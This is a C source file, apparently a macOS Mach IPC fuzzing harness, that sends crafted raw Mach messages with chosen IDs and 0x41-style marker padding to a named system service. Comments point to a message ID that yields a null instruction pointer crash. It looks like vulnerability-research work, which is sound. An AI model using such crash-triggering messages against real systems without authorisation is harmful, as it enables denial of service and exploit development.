#include "fuzz_interface.h"
#include <stdio.h>


int send_msg(char *service, int id)
{
  uint32_t string[] = {
    'fuck',
    0x0000000F,
    0x00000002,
    0x55555555,
    0x77777777,
    0xFFFFFFEB,
    0x41414141,
    0x41414141,
    0x41414141,
  };

  mach_port_t mach_port = MACH_PORT_NULL;
  kern_return_t err =  get_service_from_bootstrap(service, &mach_port);

  if (err != KERN_SUCCESS || mach_port == MACH_PORT_NULL) {
    return 0;
  }

  raw_mach_msg_t test_msg;
  memset(&test_msg, 0, sizeof(test_msg));
  printf("sizeof(test_msg): %zu\n", sizeof(test_msg));

  //setting up the header
  test_msg.header.msgh_bits =
      MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, MACH_MSG_TYPE_MAKE_SEND_ONCE); //| MACH_MSGH_BITS_COMPLEX;
  test_msg.header.msgh_size = sizeof(test_msg);
  test_msg.header.msgh_remote_port = mach_port;
  test_msg.header.msgh_local_port = mig_get_reply_port();
  test_msg.header.msgh_id = id;

  // optional: filling up the padding:
  for (size_t i = 0; i < 0x4; i++) {
    test_msg.padding[i] = 0x41;
  }
  for (size_t i = 0x4; i < 0x8; i++) {
    test_msg.padding[i] = 0x42;
  }
  for (size_t i = 0x8; i < 0xC; i++) {
    test_msg.padding[i] = 0x43;
  }
  for (size_t i = 0xc; i < 0x10; i++) {
    test_msg.padding[i] = 0x44;
  }
  // for (size_t i = 0x10; i < 0x14; i++) {
  //   test_msg.padding[i] = 0x45;
  // }

  // //setting up the header for RIP Null
  // test_msg.header.msgh_bits =
  //     MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, MACH_MSG_TYPE_MAKE_SEND_ONCE); //| MACH_MSGH_BITS_COMPLEX;
  // test_msg.header.msgh_size = sizeof(test_msg);
  // test_msg.header.msgh_remote_port = mach_port;
  // test_msg.header.msgh_local_port = mig_get_reply_port();
  // test_msg.header.msgh_id = id;
  //
  // // optional: filling up the padding:
  // for (size_t i = 0; i < 0x8; i++) {
  //   test_msg.padding[i] = 0x42;
  // }
  // test_msg.padding[8] = 0x5;


  // complex_mach_msg_ool_t test_msg;
  // memset(&test_msg, 0, sizeof(test_msg));
  // printf("sizeof(test_msg): %zu\n", sizeof(test_msg));
  // //setting up the header
  // test_msg.header.msgh_bits =
  //     MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, MACH_MSG_TYPE_MAKE_SEND_ONCE); //| MACH_MSGH_BITS_COMPLEX;
  // test_msg.header.msgh_size = sizeof(test_msg);
  // test_msg.header.msgh_remote_port = mach_port;
  // test_msg.header.msgh_local_port = mig_get_reply_port();
  // test_msg.header.msgh_id = id;
  //
  // // setting up the body
  // test_msg.body.msgh_descriptor_count = 0x1;
  //
  // // setting up the OOL descriptor
  // test_msg.data.address = string;
  // test_msg.data.size = sizeof(string);
  // test_msg.data.deallocate = FALSE;
  // test_msg.data.copy = MACH_MSG_PHYSICAL_COPY;
  // test_msg.data.type = MACH_MSG_OOL_DESCRIPTOR;
  //
  // //setting up the size
  // test_msg.ool_size = test_msg.data.size;
  //
  // // optional: filling up the padding:
  // for (size_t i = 0; i < 0x1C; i++) {
  //   test_msg.padding[i] = 0x42;
  // }

    printf("%d\n", id);
    err = mach_msg(&test_msg.header, MACH_SEND_MSG | MACH_RCV_MSG,
      sizeof(test_msg), sizeof(test_msg),
      test_msg.header.msgh_local_port, 2000, MACH_PORT_NULL);

    if (err == KERN_SUCCESS){
      printf("test_msg.header.msgh_id = %d\n",id);
      printf("successfully sent the mach message\n");
    }
    else
      printf("failed to send the mach message: %s\n", mach_error_string(err));

  return 0;
}

int main(int argc, char *argv[])
{
  if(argc < 2)
  {
    printf("requires 1 argument!\n");
    return 0;
  }

//0x178f4 -> first
//0x17928 -> last
// RIP Null
//	send_msg(argv[1],0x17908);

  send_msg(argv[1],0x1791C);

	return 0;
}
